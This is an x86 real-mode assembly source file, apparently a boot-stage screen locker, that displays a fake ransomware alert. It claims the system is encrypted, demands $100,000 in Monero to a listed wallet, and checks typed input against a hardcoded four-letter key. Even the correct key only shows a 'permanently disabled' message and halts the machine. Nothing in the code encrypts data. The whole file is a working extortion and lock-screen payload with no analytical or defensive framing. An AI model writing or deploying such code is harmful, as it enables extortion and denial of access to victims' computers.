[org 0x8000]
[bits 16]

start:
    cli
    xor ax, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7E00
    sti

    mov [boot_drive], dl

    mov ax, cs
    mov ds, ax
    cld

    ; Set video mode
    mov ax, 0x0003
    int 0x10

    ; Clear screen by scrolling
    mov ax, 0x0600  ; AH=06 (scroll), AL=00 (full screen)
    mov bh, 0x07    ; White on black
    xor cx, cx      ; CH=0, CL=0 (top-left)
    mov dx, 0x184F  ; DH=24, DL=79 (bottom-right)
    int 0x10

    ; Display title with warning symbols
    mov bh, 0
    mov dh, 1
    mov dl, 0
    call move_cursor
    mov si, warning
    call print_str
    mov si, title
    call print_str
    mov si, warning
    call print_str

    ; Display organization message
    mov dh, 3
    mov dl, 0
    call move_cursor
    mov si, lock_msg1
    call print_str

    ; Display payment instructions
    mov dh, 5
    mov dl, 0
    call move_cursor
    mov si, lock_msg2
    call print_str

    mov dh, 6
    mov dl, 0
    call move_cursor
    mov si, lock_msg3
    call print_str

    mov dh, 7
    mov dl, 0
    call move_cursor
    mov si, lock_msg4
    call print_str

    ; Draw input field
    mov dh, 10
    mov dl, 0
    call move_cursor
    mov si, prompt
    call print_str

    mov dh, 11
    mov dl, 0
    call move_cursor
    mov si, input_field
    call print_str

    ; Position cursor at input start position
    mov dh, 11
    mov dl, 6        ; Start input after "Key: "
    call move_cursor

    ; Clear input buffer
    mov byte [input_index], 0
    call clear_input_buffer

; Input handling loop
input_loop:
    xor ah, ah
    int 0x16        ; Wait for key press

    ; Check Enter
    cmp ah, 0x1C
    je check_input

    ; Backspace handling
    cmp ah, 0x0E
    je backspace

    ; FIXED: Proper A-Z/a-z validation
    cmp al, 'A'
    jb input_loop     ; Below 'A'? Ignore
    cmp al, 'Z'
    jbe valid_char    ; A-Z? Valid
    cmp al, 'a'
    jb input_loop     ; Between Z and a? Ignore
    cmp al, 'z'
    ja input_loop     ; Above 'z'? Ignore
    ; Otherwise it's a-z - fall through to valid_char

valid_char:
    ; Convert to uppercase
    and al, 0xDF

    ; Store character in buffer
    movzx bx, byte [input_index]
    mov [input_buffer + bx], al

    ; Print character
    mov ah, 0x0E
    int 0x10

    ; Increment index
    inc byte [input_index]
    cmp byte [input_index], 4
    jb input_loop
    jmp check_input

backspace:
    cmp byte [input_index], 0
    je input_loop
    dec byte [input_index]
    ; Erase char on screen
    mov ah, 0x0E
    mov al, 8       ; Backspace
    int 0x10
    mov al, '_'     ; Replace with underscore
    int 0x10
    mov al, 8       ; Backspace again
    int 0x10
    jmp input_loop

check_input:
    ; Verify length
    cmp byte [input_index], 4
    jne wrong_key

    ; Check key
    mov cx, 4
    mov si, input_buffer
    mov di, secret_key
    repe cmpsb
    jne wrong_key
    jmp unlock

wrong_key:
    ; Show error
    mov dh, 13
    mov dl, 0
    call move_cursor
    mov si, error_msg
    call print_str

    ; Reset input
    mov byte [input_index], 0
    call clear_input_buffer

    ; Redraw input field
    mov dh, 11
    mov dl, 0
    call move_cursor
    mov si, input_field
    call print_str
    mov dh, 11
    mov dl, 6        ; Position cursor at input start
    call move_cursor

    ; Delay
    mov cx, 0x7FFF
.delay:
    nop
    loop .delay

    ; Clear error
    mov dh, 13
    mov dl, 0
    call move_cursor
    mov si, clear_error
    call print_str

    mov dh, 11
    mov dl, 6        ; Position cursor at input start
    call move_cursor
    jmp input_loop

unlock:
    ; Display final messages
    mov dh, 15
    mov dl, 0
    call move_cursor
    mov si, suck_msg1
    call print_str
    
    mov dh, 16
    mov dl, 0
    call move_cursor
    mov si, suck_msg2
    call print_str
    
    ; Halt the system
    hlt

; Utilities
move_cursor:
    mov ah, 0x02
    mov bh, 0
    int 0x10
    ret

print_str:
    lodsb
    test al, al
    jz .done
    mov ah, 0x0E
    int 0x10
    jmp print_str
.done:
    ret

clear_input_buffer:
    mov cx, 5
    mov di, input_buffer
    xor al, al
    rep stosb
    ret

; Data
warning db "!!! ", 0
title db "CRITICAL SYSTEM ENCRYPTION ALERT", 0
lock_msg1 db "The Organization has Attacked and there is no Escaping", 0
lock_msg2 db "Your system has been encrypted with military-grade ransomware.", 0
lock_msg3 db "To restore access, pay $100,000 USD in Monero (XMR) to:", 0
lock_msg4 db "Wallet: 8A9bC3dE4FgH5iJ6kL7mN8oP9qR0sT1uV2wX3yZ4aB5cD6eF7gH8i", 0
prompt db "Enter decryption key:", 0
input_field db "Key: ____", 0
error_msg db "ERROR: Invalid decryption key. Access denied.", 0
clear_error db "                                                   ", 0
suck_msg1 db "TERMINAL LOCK ACTIVATED. SYSTEM PERMANENTLY DISABLED.", 0
suck_msg2 db "YOU SUCK! - The Organization", 0
secret_key db "COAL"

boot_drive db 0
input_index db 0
input_buffer times 5 db 0

times 2048 - ($ - $$) db 0